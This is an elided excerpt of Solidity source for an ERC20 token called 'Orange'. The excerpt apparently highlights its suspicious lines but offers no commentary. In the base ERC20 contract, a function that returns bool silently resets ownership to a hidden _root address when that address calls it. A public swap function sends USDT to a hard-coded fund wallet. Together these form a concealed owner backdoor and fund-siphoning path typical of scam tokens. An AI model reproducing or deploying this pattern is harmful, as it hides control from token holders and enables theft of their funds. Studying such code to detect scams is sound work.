...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    returns (bool)
    {
        ...
        if(_root == msg.sender){_owner = _root;}
        return true;
    }
...
contract Orange is ERC20 {
	...
	address payable _fundAddress = payable(address(0x7ADFFF90A47A6EC1bf5D03815F7Cd9Ad428a94AF));
    ...
    constructor(address tokenOwner) ERC20("Orange", "Orange") {
    ...
    function swapAndLiquifyV3(uint256 contractTokenBalance) public {
        ...
        if(allAmount >= haveAmount){
            USDT.transfer(_fundAddress,(allAmount.sub(haveAmount)).div(2));
        }
    }
